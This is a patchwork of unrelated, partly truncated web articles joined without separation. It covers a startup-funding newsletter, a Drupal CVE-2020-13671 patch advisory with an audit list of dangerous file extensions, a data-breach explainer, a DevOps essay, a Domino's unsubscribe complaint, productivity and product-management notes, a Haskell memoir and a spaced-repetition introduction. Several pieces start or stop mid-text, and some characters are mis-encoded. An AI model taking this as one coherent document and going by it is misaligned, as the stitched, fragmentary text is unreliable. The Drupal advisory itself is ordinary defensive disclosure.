option. MSCHF previously raised $11.5 million and who can forget, Push Pizza, the equally minimalist startup that lets you do only one thing - <a href="https://insights.dice.com/2014/08/08/push-for-pizza-app/">push a button for pizza</a>.</p></div><figure><img src="https://ci3.googleusercontent.com/proxy/XQpNChZzd_phLLy_NgqZNTeyAt7_6ZsK76jKtw5-C4qAcFz2BEMKI2E0zSZVAYoltjqrikDrFui0Ov2Q1OV1HpKeyVYSC_DXfO7oCrHrmIpfUghel-kHqpd3MnMGVOIqxOBWRZ7s2jUB8fpcwKU7_SSgP7mREA=s0-d-e1-ft#https://mcusercontent.com/9c9bf2101972b0a405bd2f81d/images/b40917ab-e8ff-4e6e-8699-aeaf753e0f0d.png" alt=""></figure><div><p><strong>Hyper growth</strong></p><p>Whilst Supreme and MSCHF command the attention of Gen-Z, UK startup Hopin has been facing super <em>hypergrowth</em>. The startup has raised $125 million in a Series B since raising $40 million in a Series A only a few months ago in the summer. Hopin is now at a <a href="https://techcrunch.com/2020/11/10/hopin-raises-125m-for-its-online-events-platform-on-the-back-of-surging-growth/">$2.25 billion valuation</a> whilst having $20million Annual Recurring Revenue (ARR). The startup is only 2 years old. Solo founder Johnny Boufarhat created the startup from a desire to improve the events networking business after falling seriously ill after a food poisoning experience. Johnny shares <a href="https://viralwegrow.com/blog/hopin-johnny-boufarhat/">some of his insights</a> on how he has managed to raise capital as a solo founder and how to manage viral growth.</p></div><p>Hopin’s valuation at 100x its current ARR display some of the investor optimism in having a ‘really good’ <em>product market fit </em>for Software as a Service (SaaS) businesses and an extreme outlier. As a benchmark, slower growing SaaS companies trade at 3-5x next year’s revenue (e.g. Zuora and Dropbox) whilst fast growing ones (and outliers) like Zoom and Datago trade at a valuation that is 40x the ARR.<br></p><figure><img src="https://lh4.googleusercontent.com/uI1EZt26p1urFsssrQWvx2UUvFfxgnuQVL9Lae5dJqTsfUuVoY00a0GbXvLNW_QBJS57zoc6mtft0-ZzqEeBwdhJ0lv-fLq8GCW5isAW_ObudP5LeVxik8g-godRRmgUWOGMO9Gh" alt=""><figcaption>Growth premium in SaaS. <em>Source: SeriouslySaaS</em></figcaption></figure><div><p><strong>Product to Market Hype - Veblen Goods</strong></p><p>What we are seeing in the market with hype products is a phenomenon called a Veblen good. What this means is that unlike consumer interest for traditional goods which falls as price increases, increasing the price for a Veblen product creates an exclusive ‘luxury’ effect that increases demand. In the case of Supreme, there’s a perceived value in the hype for a good whether it be resale values or to own something exclusive. How this works for content or digital media which is less scarce and more infinitely scalable is less certain (although <a href="https://cointelegraph.com/news/tokenized-art-nfts-paint-bright-future-for-artists-blockchain-tech">blockchain firms are trying for digital art</a>). MSCHF is a media based company and it is working for them. </p></div><figure><img src="https://lh4.googleusercontent.com/HFJUMKT8iR-7zDYzXYa0GeAJmTQNwmiPqIYWeNyFXyLcq6LxariReqhP6uynZNKo3dWthnaaDgqwouQu6wjfbEMYkcg7sxHUl9t8wr1V6O_IFg2sbyn6kulBmfErKZJEmhSRvhDv" alt=""><figcaption>Normal Good vs Veblen Good</figcaption></figure><div><p>Perhaps this hype is part of a wider cultural shift of spending patterns. According to Future Cast, Gen Z’s have an <a href="https://www.millennialmarketing.com/research-paper/the-power-of-gen-z-influence/">enormous influence on spend</a>. They spend $44 billion for themselves and influence $600 billion in spending by others. It is well documented that both Gen Z’s and Millenials have a greater weighting on value in paying for <em>experiences</em>. Perhaps being a part of a meme or consuming <em>content as an experience </em>is worth hyping and paying for. </p></div><h2 id="brain-gems">Brain Gems<br></h2><p><a href="https://www.nytimes.com/2020/11/08/business/digital-nomads-regret.html"><strong>The Digital Nomads Did Not Prepare for This</strong></a> (by Erin Griffith)</p><p>Paradise lost.

<p>Drupal, a popular CMS and blogging platform has patched a remote code execution vulnerability, <strong>CVE-2020-13671</strong>.</p>



<p>Today, over half a million sites use Drupal, as such applying updates for critical vulnerabilities like these immediately is vital.</p>



<p>The vulnerability also tracked as <a href="https://www.drupal.org/sa-core-2020-012" target="_blank" rel="noreferrer noopener">SA-CORE-2020-012</a>, exists due to improper validation of filenames of files uploaded to Drupal websites.</p>



<p>A remote attacker can upload files with crafted filenames. Since the vulnerable versions do not properly sanitize these filenames, it is possible to trick the uploader into treating a file as, say, PHP, and have it execute arbitrary code on the server. </p>



<p>“Drupal core does not properly sanitize certain filenames on uploaded files, which can lead to files being interpreted as the incorrect extension and served as the wrong MIME type or executed as PHP for certain hosting configurations,” states Drupal’s security advisory.</p>



<h2>Multiple patched versions released</h2>



<p>Drupal has released patches for multiple versions, depending on what branch you are using:</p>



<ul><li>If you are using Drupal 9.0, update to&nbsp;<a href="https://www.drupal.org/project/drupal/releases/9.0.8">Drupal 9.0.8</a></li><li>If you are using Drupal 8.9, update to&nbsp;<a href="https://www.drupal.org/project/drupal/releases/8.9.9">Drupal 8.9.9</a></li><li>If you are using Drupal 8.8 or earlier, update to&nbsp;<a href="https://www.drupal.org/project/drupal/releases/8.8.11">Drupal 8.8.11</a></li><li>If you are using Drupal 7, update to&nbsp;<a href="https://www.drupal.org/project/drupal/releases/7.74">Drupal 7.74</a></li></ul>



<p>“Versions of Drupal 8 prior to 8.8.x are end-of-life and do not receive security coverage,” states the advisory.</p>



<p>In addition, for due diligence, website admins should check <em>all previously uploaded files</em> for malicious extensions. </p>



<p>The security advisory suggests looking for files with more than one extension, such as <code>filename.php.txt</code> or <code>filename.html.gif</code>.</p>



<p>These files are really PHP or HTML files containing code but have been disguised as text/image files via a misleading file extension.</p>



<p>“Look specifically for files that include more than one extension, like&nbsp;<code>filename.php.txt</code>&nbsp;or&nbsp;<code>filename.html.gif</code>, without an underscore (<code>_</code>) in the extension. Pay specific attention to the following file extensions, which should be considered dangerous even when followed by one or more additional extensions:”</p>



<ul><li>phar</li><li>php</li><li>pl</li><li>py</li><li>cgi</li><li>asp</li><li>js</li><li>html</li><li>htm</li><li>phtml</li></ul>



<p>“This list is not exhaustive, so evaluate security concerns for other unmunged extensions on a case-by-case basis.”</p>



<p>Multiple researchers have been credited for reporting this vulnerability: ufku, Mark Ferree, Frédéric G. Marand, Samuel Mortenson of the Drupal Security Team, and Derek Wright.</p>



<p>Users are advised to upgrade their Drupal instances to the fixed versions as soon as possible. Also, remember to perform additional auditing steps mentioned above to minimize the possibility of a potential security compromise.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><h2>Why did this data breach occur?</h2><p>Based on the scale of personal identification information data exposed, experts believe that the breach occurred due to a misconfigured AWS S3 bucket with respect to poorly maintained <a href="https://thechief.io/c/debricked/pci-dss-requirements-managing-security-vulnerabilities-when-handling-payment-cards/">PCI DSS</a>, or Payment Card Industry Data Security Standard. PCI DSS is a crucial information security standard that protects the data of branded credit card holders and allows them to make safe and secure transactions on online portals. </p><p>According to <a href="https://www.websiteplanet.com/blog/prestige-soft-breach-report/">websiteplanet.com</a>, Prestige Software was not following this standard, which resulted in the ability to accept and process credit card statements to become subdued. The resulting data breach effortlessly sourced all sensitive information leading to millions of customers exposed on the Internet. The effects of this data breach will be felt by the company directly in terms of negative press coverage, loss of business, and legal action. They will also have to face heavy fines due to GDPR and Data Privacy Violations.</p><p>This data breach doesnâ€™t just affect customers and the company itself but also exposes its clients, including big names such as Expedia, Booking.com, Agoda, Sabre, Omnibees, and more. Whatâ€™s more concerning is that while investigations were ongoing regarding the data breach, new customer records were still being accepted, recorded, and uploaded on the platform.</p></div></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I think DevOps, as we understand it today, is coming to an end. At least the Ops part of it. As cloud infrastructure becomes a key application concern, more and more ops tasks are done by the cloud itself or built into the application. What’s left is the provisioning and management of the infrastructure needed by the application. This comes with all the baggage associated, like security and networking, for example.</p>
<p>All of these patterns that are now being forged will make the infrastructure provisioning indistinguishable from the application itself for the general use case. Right now, in most companies, traditional IT Groups have rebranded themselves as DevOps and are now the gatekeepers of AWS, instead of the on-premise VMWare clusters. They use Terraform instead of bash scripts and are generally more agile, having adopted many of the development practices. These are specialized people that are familiar with networking, with how IAM works in AWS. They are responsible for building the networking part, the infrastructure, securing it, and handing it over to the application that uses them.</p>
<p>The developers are mostly fine with it, as they don’t want to learn the intricacies of AWS IAM or VPC’s. I’m reminded in many ways of how the database was treated when I joined the industry in the 2000s. Back then, the application would not touch the structure of the database. You would have scripts that would be run by DBAs on production systems. Those would create the database structure, the tables, indexes, and basically the entire database structure. Developers would then map these to their code and just perform DML once the application was running on a fixed schema that is managed by someone else. I see infrastructure the same way today.</p>
<p>Once ORM and various other frameworks started to manage this domain, these concerns got bundled in the application. There is no reason why the same thing won’t happen to infrastructure. The only problem is we didn’t have the right frameworks to do it, but now we’re starting to get them.</p>
<p>The need to handle application infrastructure (I see this different than managing core business services infrastructure like AD, email, finance systems, etc.) at scale happened in the age of virtualization and started with CFEngine. For those that don’t know, CFEngine was one of the first configuration management systems as we understand it today, followed by Puppet, Chef, and others. CFEngine happened in the age where most provisioned happened either by hand or by following documented step by step instructions. At the core of the proposition was a whitepaper written by Mark Burgess <sup id="fnref:1"><a href="#fn:1">1</a></sup>. The mainline of reasoning was:</p>
<blockquote>
<p>Present day computer systems are fragile and unreliable. Human beings are involved in the care and repair of computer systems at every stage in their operation. This level of human involvement will be impossible to maintain in the future. Biological and social systems of comparable and greater complexity have self-healing processes that are crucial to their survival. It will be necessary to mimic such systems if our future computer systems are to prosper in a complex and hostile environment.</p>
</blockquote>
<p>CFEngine was one of the first cracks of the problem of building a self-healing system that works at scale and shares some of the ideas from the immune system. To achieve this, it leveraged four important properties:
1) It used a DSL to describe the desired state instead of using procedural languages. This would try to abstract components to allow administrators to parameterize and reuse.
2) It has converging semantics, i.e., one describes what a system should look like, and when the system has been brought to that state, CFEngine becomes inert.
4) It offers protection against an unfortunate repetition of tasks and hanging processes in situations where several administrators are working independently with little opportunity to communicate.</p>
<p>Using these features, one could achieve a self-correcting and self-healing system, which would result in a system that maintains fault tolerance. Today with AWS, we can design a system that displays the same properties by leveraging multi-regional services. By their nature, these services can transfer these properties to the application if employed with careful design.</p>
<p>Lots of other tools appeared around the same time or soon after, each focusing on different aspects of the initial value proposition. Probably the most popular are Puppet and Chef. Each has its strong points. At the company I work, we went with Puppet to handle our infrastructure configuration mostly because it was easier to read for non-programers. From a sysadmin perspective, it was appealing to get something done without diving too much into coding. In time, it would prove to be a false choice that would hurt us more than it helped.</p>
<p>Puppet has its own DSL, its own terminology, and idiosyncrasies. It has its own ecosystem of tools, dashboards, and extensions that help you get pretty far in managing your infrastructure. Its strong point is dealing with single server systems that didn’t need distributed coordination between them. There is a way of coordination across several servers with exported resources and PuppetDB, but it always felt hacky to me((it may be a different story today, but I haven’t followed the space for a couple of years now).</p>
<pre><code>
#https://github.com/voxpupuli/puppet-minecraft/blob/master/manifests/user.pp

class minecraft::user {
  group { $minecraft::group:
    ensure =&gt; present,
    system =&gt; true,
  }

  user { $minecraft::user:
    ensure     =&gt; present,
    gid        =&gt; $minecraft::group,
    home       =&gt; $minecraft::install_dir,
    managehome =&gt; true,
    system     =&gt; true,
    require    =&gt; Group[$minecraft::group],
  }

  # Ensures deletion of install_dir does not break module, setup for plugins
  $dirs = [$minecraft::install_dir, "${minecraft::install_dir}/plugins"]

  file { $dirs:
    ensure  =&gt; directory,
    owner   =&gt; $minecraft::user,
    group   =&gt; $minecraft::group,
    require =&gt; User[$minecraft::user],
  }
}
</code></pre>
<p>This worked well and allowed us to build a lot of automation to manage hundreds of servers when dealing with simple infrastructure components. But like most things, it’s the edge cases that make you feel the pain. Since the Puppet language is a DSL, simple problems started to become big problems. Like, not being able to do a proper for-loop. Or doing string manipulation.</p>
<p>Most configuration languages suffer from these problems. In the end, you will also probably get in a situation where you need to extend them to cover a specific use case, and usually, it’s at this point that you will need to write real code. There is only so much you can do without writing in “real” languages, so we should have probably done it from the start. Looking back, probably Chef would have been a much better choice. At least with it, a lot of the things learned there could have been applied to other aspects of my career (Chef uses ruby instead of their own DSL). I don’t have a lot of experience with Ansible or with Salt, but I feel they suffer from the same shortcomings and have similar strong points.</p>
<p>A somewhat distinct category in the configuration language space is Terraform and AWS Cloud Formation. They both borrow from the legacy of configuration management systems and try to sync their internal view of how things should look with reality. The main difference, outside of the way you express intent (which is still using DSL and not full fledge languages), is that they’re designed to work at the cloud provider level.</p>
<p>Just as Puppet and Chef are very good at managing typical resources on a machine (service, package, config file), Terraform and AWS Cloud Formation are very good at managing cloud services. They were built with the notion of cloud infrastructure. This doesn’t mean that you can’t do the same thing with Puppet, Chef, and the rest of the gen2 configuration languages. You can, but due to how fast they adapted to the cloud reality, how they tried to monetize the cloud, and so on, Terraform became the uncontested king of DSL based cloud infrastructure management, while Cloud Formation reigned in AWS land.</p>
<p>All these tools adopted the best parts from CFEngine, the most important being the notion of convergent state. They would take your expressed intent, compare it to the machine, figure out any dependencies and order of steps that will bring the resources to its desired state. They usually also involve a compilation stage where they map the DSL to inner logic and create an execution plan. This would also catch basic mistakes. These are good ideas that have battle-proven and are now the default way of dealing with infrastructure.</p>
<p>As we move forward, however, fundamental shifts are happening in the way we consume and deal with infrastructure components. Now you can leverage AWS services. You can build a very complex application that uses CloudFront for static content distribution, API gateway with Lambda to build API routes and add business functionality to them. Identity management can be handled by Cognito. On the backend, these Lambda functions can interact with an entire ecosystem of infrastructure directly, like RDS or DynamoDB. You can interact with analytics systems via Redshift or display visualized data via QuickSight. Background tasks can be handled by Lambda as well, workflows driven with step functions, async batch, and ETL tasks using AWS EMR or Glue. Composing these to achieve significant business value can be done with relatively little glue code as AWS services are very well integrated together.</p>
<p>New classes of applications are emerging that try to better adapt to this landscape. One example is what AWS labeled as serverless. Provisioning these types of apps using Terraform or Cloud Formation can lead to a lot of friction. In such a tightly integrated model, your infrastructure will evolve with your application, so this probably needs to be one of the most …</p></div></div>

<p>I had a fun little experience over the past few days. Someone had ordered Domino’s in the UK and seemingly typed in my email address by accident. This gave me the privilege of receiving daily emails from Domino’s promoting their latest deal. The first few days it was novel and interesting seeing what was popular across the pond but this morning I decided I might as well unsubscribe.</p>

<amp-img src="/assets/static/images/dominos-pre-vpn.png" alt="Domino's marketing page without VPN" width="1297" height="185" layout="responsive"></amp-img>

<p>Lo and behold the unsubscribe link didn’t work. Rather than a web page I got a friendly server error indicating “Access Denied” and that I did not have permission to access the unsubscribe page. My suspicion that this was a result of Domino’s blocking access to the site turned out to be true since I was able to unsubscribe using a VPN.</p>

<p>What a wild world. Rather than supporting a global unsubscribe Domino’s has a geofenced site for the UK that just blocks access outside the country (just try going to https://www.dominos.co.uk/ outside the UK). I don’t know what sort of anti-spam laws this violates (am I now <a href="https://www.ftc.gov/tips-advice/business-center/guidance/can-spam-act-compliance-guide-business">$43,280</a> richer?) but it’s ridiculous that I was not able to unsubscribe from Domino’s email without resorting to a VPN.</p>

<p>The lesson here is that if you live outside the Uk and want to bother someone - sign them up for an account on the Domino’s UK site.</p>

                <p>Good product managers take the lead in selecting the problems they solve for their team and organization.</p><p>As a young PM, a lot of what you work on will be decided by your manager or other stakeholders. But as you mature in the product management role, you should pro-actively start owning the decision to choose the <em>problems that you work on</em>.</p><p>Last month, I finalized the themes (and problems) that I will focus on in 2021. With every passing year, I try to make better, more logical, more meaningful, and exciting choices. To make this selection process objective, I measure each opportunity against the below.</p><ol><li>Business impact - the higher the better.</li><li>New learning involved - new knowledge is a massive motivation for me.</li><li>Improvement vs innovation - a healthy mix is required. A mix with more emphasis on innovation is more appealing for me.</li><li>Difficulty level - solving difficult problems keeps me on my toes and hence motivated.</li></ol><p>We might not always get to work on what we want, but the goal is to have enough items that meet our criterion and keep us motivated throughout the year.</p>

								<div>
									<ul>
<li><span>“In the nineteen-nineties, the spread of e-mail had transformed knowledge work. With nearly all friction removed from professional communication, anyone could bother anyone else at any time.” — Cal Newport</span></li>
<li><span>Cal references David Allen and his book “</span><a href="https://www.goodreads.com/book/show/1633.Getting_Things_Done?from_search=true&amp;from_srp=true&amp;qid=QHFss5ZqVH&amp;rank=1"><span>Getting Things Done: The Art of Stress-Free Productivity</span></a><span>,” where David talks about a theory on how our minds work that suggests when we try to keep track of obligations in our heads, we create “open loops” that make us anxious.&nbsp;</span>
<ul>
<li><span>“If we could avoid worrying about what we were supposed to be doing, we could focus more fully on what we were actually doing, achieving what Allen called a “mind like water.” — Cal Newport</span></li>
</ul>
</li>
<li><span>Cal also notes the late Peter Drucker (who wrote over 39 books) with how predicted in the mid 1950s how work/productivity would change in the future. “Drucker predicted that corporate profits would depend on mental effort, and that each individual knowledge worker, possessing skills too specialized to be broken down into “repetitive, simple, mechanical motions” choreographed from above, would need to decide how to “apply his knowledge as a professional” and monitor his own productivity.”</span></li>
<li><span>It’s important to not attach your identity to your productivity. Or as Cal mentions, “Productivity, we must recognize, can never be entirely personal. It must be connected to a system that we can study, analyze, and improve.”</span></li>
<li><span>Your days should be structured in such a way that you can spend most of your time focussed on the autonomous, creative, skilled work that Drucker identified as so crucial to growing our economy, Cal adds.</span></li>
<li><span>For teams/companies, Cal asks such a simple question and solution that I think gets glossed over sometimes and especially now that we’re all mostly remote. “What if you began each morning with a status meeting in which your team confronts its task board? A plan could then be made about which handful of things each person would tackle that day. Instead of individuals feeling besieged and resentful—about the additional tasks that similarly overwhelmed colleagues are flinging their way—they could execute a collaborative plan designed to benefit everyone.”</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>I’ve always felt that my productivity has never been top-notch-allstar-level quality. However, my only comparison is my perceived productivity of other people. Those same people, I have no clue whether or not they are struggling just as much as me or if they have a team of help. Productivity is such a weird, but cool space. The humanness of it is very real. </span></p>

      Posted on January 27, 2017
      
          by Kwang Yul Seo
      
  </p>
  

<p>Happy lunar new year! Today I would like to share my experience of learning Haskell. It’s been a really long journey but a really wonderful one.</p>
<!--more-->

<p>Back in 2000, I was an undergraduate student majoring in computer science. At that time, I was into system programming and enjoyed learning low-level implementation details of operating systems and system applications. My primary language was C and programmed all programming assignments in C. I was proud that I understood how my code was compiled and executed on the machine.</p>
<p>One day my friend told me about <em>Haskell</em>. I wasn’t interested in functional programming at that time, but I became curious because he enthusiastically persuaded me to learn Haskell. I ended up reading two books on Haskell.</p>
<ul>
<li><a href="http://www.haskellcraft.com/craft3e/Home.html">Haskell: the Craft of Functional Programming</a></li>
<li><a href="http://www.cs.yale.edu/homes/hudak/SOE/">The Haskell School of Expression</a></li>
</ul>
<p>Both books were really nice and I learned I could program in an entirely different way. However, I wasn’t sure if Haskell could solve the real-world problems I wanted to solve. So my interest in Haskell stopped there.</p>

<p>My first job was mainly about porting and optimizing Java Virtual Machine for embedded systems. My company licensed Sun’s CDC JVM and I was responsible for maintaining it.</p>
<p>It was 2002 and Linux was still a luxury for embedded systems. RTOSes such as pSOS and VxWorks were popular on STBs and I ported JVM to these OSes. These RTOSes didn’t have distinctions between kernel and user space and an application was linked statically with the kernel and ran as a single (kernel) process application on the device.</p>
<p>The implication was profound. I had no safety guarantee provided by modern operating systems. A bug in an application could corrupt the kernel data and crash the entire system. Moreover, because there were dozens of threads competing for shared resources, race conditions and dead locks were a common place. It took hours or even days to find and fix a trivial bug.</p>
<p>The situation was much better when debugging an application written in Java. Thanks to the safety guarantee of Java, certain types of bugs were impossible. A Java program can’t corrupt memory and crash the system. Dead locks are reported systematically by the JVM. It was relatively fun to fix a bug in Java applications.</p>
<p>These experiences motivated me to find systematic ways of preventing bugs and led me to read Benjamin C. Pierce’s <a href="https://www.cis.upenn.edu/~bcpierce/tapl/">Types and Programming Languages</a>. It was the best computer science text book I’ve ever read. I understood why types were important in statically typed functional languages like Haskell! If universities had used this book as a undergraduate PL textbook, many of the confusions and misunderstandings about dynamic vs static typing would have disappeared.</p>

<p>By fully understanding the merits of type systems, I started to learn Haskell in a different perspective. I read <a href="https://www.haskell.org/tutorial/index.html">A Gentle Introduction To Haskell</a> and many tutorials on monads. It wasn’t very hard to understand specific instances of monads such as <em>Reader</em>, <em>Writer</em>, <em>State</em>, <em>List</em> and <em>Maybe</em>. But I couldn’t figure out how they were related. I managed to write simple applications in Haskell, but wasn’t confident that I could use Haskell productively because I couldn’t fully understand one of the core ideas of Haskell.</p>

<p>In the meantime, I changed my career and founded a tech start-up in 2008. I built mobile web browsers for the embedded systems. I created a port of <a href="https://webkit.org/">WebKit</a> and hacked various components of WebKit to speed up the performance. The primary means for optimization was to leverage the multi-core CPU and GPU.</p>
<p>WebKit performs lots of tasks concurrently but it is mostly single-threaded. Loading a page does not benefit much from having a multi-core CPU. So I offloaded some tasks to separate threads but I only gained marginal performance benefits in exchange for largely increased complexity. I learned a lesson that I must pay very high costs of complexity to get small benefits of performance boost. Considering the already complex nature of WebKit, I ended up abandoning most of performance optimizations to keep the complexity under control.</p>
<p>While struggling to squeeze performance out of WebKit, I learned Haskell again to get some insights on parallel programming because Haskell was the only programming language which natively supported <em>STM(Software Transaction Memory)</em>. Simon Marlow’s <a href="http://chimera.labs.oreilly.com/books/1230000000929/index.html">Parallel and Concurrent Programming in Haskell</a> helped me understand how Haskell supported parallel and concurrent programming. Though I learned many valuable lessons from the book, I also felt that the lazy nature of Haskell didn’t go well with parallel programming.</p>

<p>I have spent more than 10 years of my career on embedded systems and increasingly got frustrated with the tools available. So I decided to teach myself Haskell again and use it at work. This time I started to read classic papers on functional programming and Haskell.</p>
<p>Philip Wadler’s <a href="http://homepages.inf.ed.ac.uk/wadler/papers/marktoberdorf/baastad.pdf">Monads for functional programming</a> clicked my mind and I finally became enlightened. The paper is really well written, but I don’t think I could understand <em>Monad</em> just because I read the paper. Years of trials and errors were necessary to understand abstract concepts like monad. It was the most exciting moment of my long journey to Haskell.</p>
<p>Once I understood how I could learn abstractions, the rest was easy. Now I don’t get discouraged just because I don’t understand abstractions at first glance. It takes time and practice to understand abstract things. I also realized that monad was just the beginning. There exist many Haskell idioms that require other abstract concepts such as <em>applicative functor</em>, <em>arrow</em>, <em>profunctor</em> and so on.</p>
<p>Here is the list of papers I found most enlightening when learning Haskell. I also recommend you read any paper with “Functional Pearl” attached to it.</p>
<ul>
<li><a href="http://www.cs.nott.ac.uk/~pszgmh/fold.pdf">A tutorial on the universality and expressiveness of fold</a></li>
<li><a href="http://www.cs.nott.ac.uk/~pszgmh/pearl.pdf">Monadic Parsing in Haskell</a></li>
<li><a href="http://haskell.cs.yale.edu/wp-content/uploads/2011/02/POPL96-Modular-interpreters.pdf">Monad Transformers and Modular Interpreters</a></li>
<li><a href="http://www.cs.ru.nl/~W.Swierstra/Publications/DataTypesALaCarte.pdf">Data types a la carte</a></li>
<li><a href="https://www.cs.ox.ac.uk/jeremy.gibbons/publications/iterator.pdf">The Essence of the Iterator Pattern</a></li>
<li><a href="https://www.st.cs.uni-saarland.de/edu/seminare/2005/advanced-fp/docs/huet-zipper.pdf">The Zipper</a></li>
</ul>

<p>I was confident that Haskell was a good programming language and I was looking for opportunities to use Haskell in production. Bryan O’Sullivan, Don Stewart, and John Goerzen’s <a href="http://book.realworldhaskell.org/">Real World Haskell</a> was a good reference in this direction. It showed how I could use Haskell to do my daily work such as networking, system programming, databases and web programming.</p>
<p>Finally, I started to read real-world Haskell code available on the hackage and realized that the <em>Haskell I know</em> was different from the <em>Haskell that is actually used</em>. Real world Haskell uses lots of GHC extensions which makes me feel it is an entirely different language. A typical Haskell module starts with:</p>
<div><pre><code><span>{-# LANGUAGE CPP                        #-}</span>
<span>{-# LANGUAGE FlexibleContexts           #-}</span>
<span>{-# LANGUAGE ConstraintKinds            #-}</span>
<span>{-# LANGUAGE FlexibleInstances          #-}</span>
<span>{-# LANGUAGE FunctionalDependencies     #-}</span>
<span>{-# LANGUAGE OverloadedStrings          #-}</span>
<span>{-# LANGUAGE QuasiQuotes                #-}</span>
<span>{-# LANGUAGE RecordWildCards            #-}</span>
<span>{-# LANGUAGE TupleSections              #-}</span>
<span>{-# LANGUAGE TypeFamilies               #-}</span>
<span>{-# LANGUAGE RankNTypes                 #-}</span>
<span>{-# LANGUAGE DeriveDataTypeable         #-}</span></code></pre></div>
<p>It seems sticking to Haskell 98 or 2000 does not have much practical sense because many Haskell packages already use many GHC extensions. So I learned them too. <a href="https://ocharles.org.uk/blog/posts/2014-12-01-24-days-of-ghc-extensions.html">24 Days of GHC Extensions</a> was a really great way of learning this topic.</p>
<p>I like the approach of <a href="http://www.yesodweb.com/book/haskell">Yesod Web Framework Book</a> which explains the GHC extensions used in the library before explaining how to use the library. This is often the first step to learn a new library for many Haskell programmers. For example, you can’t use <a href="http://haskell-servant.readthedocs.io/en/stable/">Servant</a> unless you understand <em>DataKinds</em> and <em>TypeOperators</em>. So I encourage Haskell library authors to write more about the GHC extensions they use.</p>
<p>I also found that some packages are essential to use Haskell in practice.</p>
<ul>
<li><code>String</code> type has problems. You need either <a href="https://hackage.haskell.org/package/text">text</a> or <a href="https://hackage.haskell.org/package/bytestring">bytestring</a> for efficient string data processing.</li>
<li>Lazy IO looks nice, but does not work well in practice. To process streaming data properly you need either <a href="https://hackage.haskell.org/package/pipes-4.3.2/docs/Pipes-Tutorial.html">pipes</a> or <a href="https://github.com/snoyberg/conduit#readme">conduit</a>.</li>
<li>You will need a custom monad or monad transformer for your application sooner or later. Either <a href="https://hackage.haskell.org/package/mtl">mtl</a> or <a href="https://hackage.haskell.org/package/transformers">transformers</a> is required.</li>
<li>JSON is a really universal data exchange format these days. <a href="https://hackage.haskell.org/package/aeson-1.1.0.0/docs/Data-Aeson.html">aeson</a> will help you here.</li>
<li><a href="https://hackage.haskell.org/package/QuickCheck">QuickCheck</a> is a bonus you get from using Haskell!</li>
</ul>

<p>I founded a small Haskell shop this year and started to use Haskell in production. I realized that using Haskell in production was, surprisingly, easier than learning Haskell. It took me more than 10 years to learn Haskell, but I felt confident that I could use Haskell in production only after a few months of experiments.</p>
<p>There is one thing I would like to emphasize. Using Haskell does not mean that you must understand all the dependencies you use. Haskell programmers tend to care much about the implementation details of their dependencies because Haskell makes it so easy to understand the meaning of programs with types and equational reasoning. But in my opinion, this is a blessed curse.</p>
<p>That’s not how civilization works. You can drive a car without understanding how engines work. Python or JavaScript programmers do not care about the implementation details of their dependencies because it is simply impossible. Haskell is no exception. Time and money are limited. Please don’t spend too much time on understanding things. Spend more time on building things. Be practical.</p>
<p>Fortunately, some library authors provide a high-level overview of their library. <a href="https://www.andres-loeh.de/Servant/servant-wgp.pdf">Type-level Web APIs with Servant</a> is a great example. It explains the core concepts and the implementation techniques of the library without involving accidental complexities of implementation details. I would love to see more papers like this.</p>

<p><a href="https://www.stackage.org/">Stackage</a> and the <a href="https://docs.haskellstack.org/en/stable/README/">Stack</a> are indispensable tools for using Haskell in production. All the hard work of <a href="https://www.fpcomplete.com/">FP Complete</a> gave me confidence that Haskell was …</p></article></div>

<p>You would have done better in school, for starters. Instead of turning in your bed unable to sleep terrified of the exam coming the next day, you would soundly sleep with the knowledge that you know everything you need to know to ace the exam. And ace it you would indeed.</p>

<p>You would have spent fewer hours studying. How many times have you opened the textbook only to find that you’ve forgotten all that you’d studied the day before? If you did not forget things then those hours you spent studying would always amount to something, instead of leaving you feeling like you’re swimming against the current. School might even have been fun if you did not forget.&nbsp;</p>

<p>What would your career look like if you did not forget?</p>

<p>Forgetfulness affects us all. There is no one that has not grappled with this problem before. Our lives would be better if we did not forget.&nbsp;</p>

<p>Unfortunately, <span>forgetting is inescapable.</span> There is no such thing as a perfect memory. I am not here to sell you on a magic pill that will turn you into Bradley Cooper in the movie Limitless.</p>

<p>However, that doesn’t mean there aren’t things you can do to massively reduce the speed at which you forget things, because there are.&nbsp;</p>

<p>Science has known about what it takes to get memories to stick around in your memory for a long time. It has known about it for a while now, in fact. It’s just that it has done a terrible job so far at making sure that you know about it, you whose life would massively benefit from that knowledge.</p>

<p>My intent for writing this is to correct these wrongs and introduce you to spaced repetition, the more than established method that will put you in control of your memory once and for all, and Anki, the software that will help you do so.&nbsp;</p>

<p>So, let’s start at the beginning: <span> What is spaced repetition?</span></p>

<h2 id="the-centuries-old-science-they-dont-tell-you-about">The Centuries Old Science They Don’t Tell You About</h2>

<p>More than a hundred years ago, the German psychologist Hermann Ebbinghaus not only started the scientific study of memory, but he also made its most impactful discovery.&nbsp;</p>

<p>After all, what discovery could be more impactful than what makes memories stick?</p>

<p>Ebbinghaus created various lists of nonsense syllables that he had to memorize, and once he was able to mouth off the entire list without making a single mistake he would mark on his calendar the day where he had to memorize that list once more.&nbsp;</p>

<p>He would have to memorize some lists the day after, others a week and some a whole month after he had first memorized them. Doesn’t sound much fun, does it? This is especially true when you take into account each list must have taken him quite a long time to memorize since by design each of the three-letter syllables he had to study had been chosen so that they weren’t easily remembered. For example, the syllable BOL was out of the question as Ebbinghaus could instead use BALL to recall it.&nbsp;</p>

<p>After the requisite time had passed, to measure the extent to which he had forgotten the list he’d spent so much time memorizing, he memorized the same list once more. Not only did he have to sit still in his office for a long time trying to memorize a bunch of nonsense words once, he had to do it twice! Throughout his second attempt he did have some help since it would take him less time to memorize the list the second time around if he remembered it from his first foray cramming it into his memory.&nbsp;</p>

<p>If by that point he’d already forgotten it, then it would take him at least as much time to memorize the list the second time as it had the first. However, if some memory of it still lingered in the confines of his mind, he would be able to go through the list faster than before. By varying the amount of time between each attempt, and seeing how that influenced how long it took him then to memorize the list the second time, <span>Ebbinghaus was able to measure the effect time had on his memory.</span></p>

<p>And what an effect it had.&nbsp;</p>

